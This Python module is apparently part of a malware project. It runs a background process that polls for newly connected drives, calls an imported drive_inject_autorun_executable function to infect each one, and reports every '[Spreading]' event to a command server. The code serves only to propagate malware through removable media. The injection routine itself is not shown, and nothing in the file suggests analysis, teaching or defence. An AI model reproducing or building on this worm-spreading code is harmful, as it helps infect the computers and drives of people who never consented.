import multiprocessing
from . import fs
from .config import FEATURE_DRIVES_WATCHING_ENABLED
from .injector import drive_inject_autorun_executable
from .utils import list_difference
from .debug import message as debug_message


def drives_watching_thread() -> None:
    """ Thread function that do drives watching and also infecting it if enabled. """

    from .server import server_message

    try:
        current_drives = fs.try_get_drives_list()

        while True:
            latest_drives = fs.try_get_drives_list()

            connected_drives = list_difference(latest_drives, current_drives)
            disconnected_drives = list_difference(current_drives, latest_drives)

            for drive in connected_drives:
                server_message(f"[Spreading] Connected drive {drive}!")
                debug_message(f"[Spreading] Connected drive {drive}!")
                drive_inject_autorun_executable(drive)

            for drive in disconnected_drives:
                server_message(f"[Spreading] Disconnected drive {drive}!")
                debug_message(f"[Spreading] Disconnected drive {drive}!")

            current_drives = fs.try_get_drives_list()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Drives Watching] Error when watching drives! Exception - {exception}")
    except KeyboardInterrupt:
        return

def drives_waching_start() -> None:
    """ Starts drive watching. """

    if not FEATURE_DRIVES_WATCHING_ENABLED:
        return

    global _drives_watching_thread
    _drives_watching_thread = multiprocessing.Process(target=drives_watching_thread, args=())
    _drives_watching_thread.start()

def drives_watching_terminate():
    # If you don`t terminate, there is some unexpected behavior.
    if isinstance(_drives_watching_thread, multiprocessing.Process):
        _drives_watching_thread.terminate()
    
_drives_watching_thread: multiprocessing.Process = multiprocessing.Process()